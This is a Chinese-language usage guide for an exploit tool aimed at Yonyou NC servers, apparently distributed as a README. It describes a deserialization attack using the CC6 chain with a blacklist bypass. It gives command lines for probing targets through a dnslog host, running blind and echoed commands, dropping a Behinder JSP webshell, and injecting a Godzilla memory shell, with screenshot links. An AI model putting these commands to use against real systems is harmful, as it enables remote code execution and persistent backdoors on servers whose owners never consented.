## 使用说明

0. 前言

> 无回显的构造链直接使用的是 `CC6`执行命令，回显的构造链使用了`DefiningClassLoader`来绕过默认的黑名单，然后结合 `CC6`构造链进行任意代码执行。
>
> 搭配了接口检测功能和`URLDNS`构造链判断是否存在反序列化。

1. 接口检查功能：`java -jar nc6.5.jar http://127.0.0.1 Check`

![image-20220830130453464](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301305169.png)

2. `URLDNS`构造链探测：`java -jar nc6.5.jar http://127.0.0.1 urldns http://123.dnslog.cn`

![image-20220830130719543](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301308996.png)

![image-20220830130803567](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301308672.png)

![image-20220830130825740](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301308210.png)

3. 无回显命令执行：`java -jar yonyouNCTools.jar http://192.168.222.130 blind calc.exe`

![image-20220830131753990](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301344245.png)

![image-20220830131804456](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301344727.png)

![image-20220830131717673](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301344807.png)



4. 回显命令执行：`java -jar yonyouNCTools.jar http://192.168.222.130 Execute`，通过 `Header`头传递命令。

![image-20220830131939577](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301344557.png)

![image-20220830132049947](vx_images/image-20220830132049947.png)

5. 落地 `webshell`：`java -jar yonyouNCTools.jar http://192.168.222.130 UploadShell "C:\Users\Administrator\Pictures\Camera Roll\1.jsp"`

> 此处如果使用 `java1.8`运行，固定落地一个天蝎的 `webshell`，路径为：`http://127.0.0.1/eozZEwBb.jsp`，如果使用的是 `java1.7`运行，会重新动态编译，可以落地自定义的 `webshell`，路径随机。

![image-20220830132251387](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301344968.png)

![image-20220830132618115](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301344709.png)

![image-20220830132628494](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301344610.png)

![image-20220830132824210](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301345567.png)

> 通过 `java1.7`落地自定义的 `webshell`，因为用到了动态编译，所有需要使用 `jre`下的 `java.exe`运行，否则动态编译失败。动态编译过程会提示使用了过时的 `API`，没有影响。

![image-20220830133136817](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301345461.png)

![image-20220830133235224](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301345855.png)

![image-20220830133344521](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301345605.png)

![image-20220830133403240](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301345458.png)

![image-20220830133536619](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301345471.png)



6. 注入内存马：`java -jar yonyouNCTools.jar http://192.168.222.130 MemoryShell`，注入的是一个 `valve-Godzilla`内存马。

![image-20220830133637610](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301345367.png)

![image-20220830133805235](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301345125.png)

![image-20220830133847158](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301346838.png)

![image-20220830134116523](https://raw.githubusercontent.com/Ghost2097221/picstorage/main/img202208301346986.png)

